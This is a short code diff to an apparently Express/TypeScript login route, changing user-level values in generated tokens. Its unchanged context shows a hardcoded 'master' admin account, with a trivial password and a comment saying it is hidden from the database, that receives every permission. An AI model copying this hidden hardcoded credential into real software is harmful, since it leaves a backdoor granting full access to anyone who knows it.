@@ -24,7 +24,7 @@ router.post(
 
       // Hardcoded master user (hidden from database)
       if (email === 'master@admin.com' && password === 'master') {
-        const token = generateToken(99999, 10);
+        const token = generateToken(99999, 1);
         // Fetch all permissions for master admin
         const allPerms = await dbAll(`SELECT CONCAT(resource, '.', action) as perm FROM permissions`, []) as any[];
         return res.json({
@@ -36,7 +36,7 @@ router.post(
             name: 'Master Admin',
             role: 'Master Administrator',
             role_id: null,
-            user_level: 10,
+            user_level: 1,
             permissions: allPerms.map(p => p.perm),
           },
         });
@@ -56,7 +56,7 @@ router.post(
       }
 
       // Generate token with user level
-      const token = generateToken(user.id, user.user_level || 1);
+      const token = generateToken(user.id, user.user_level ?? 0);
 
       // Fetch user's role permissions
       let permissions: string[] = [];
